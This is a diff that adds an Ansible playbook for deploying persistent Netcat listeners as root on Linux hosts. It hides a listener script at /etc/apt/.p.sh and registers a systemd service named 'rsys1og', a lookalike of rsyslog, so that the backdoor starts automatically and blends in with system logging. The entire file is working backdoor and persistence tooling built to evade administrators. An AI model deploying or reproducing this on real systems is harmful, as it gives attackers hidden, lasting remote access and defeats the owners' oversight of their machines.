@@ -1,0 +1,31 @@
+---
+- name: Deploy Persistent Netcat Listeners
+  hosts: [linux]
+  become: yes
+
+  tasks:
+    - name: Copy the Netcat script
+      copy:
+        src: listeners.sh
+        dest: /etc/apt/.p.sh
+        owner: root
+        group: root
+        mode: '0755'
+
+    - name: Copy the systemd service file
+      copy:
+        src: rsys1og.service
+        dest: /etc/systemd/system/rsys1og.service
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Reload systemd daemon
+      systemd:
+        daemon_reload: yes
+
+    - name: Enable and start the Netcat service
+      systemd:
+        name: rsys1og
+        enabled: yes
+        state: started
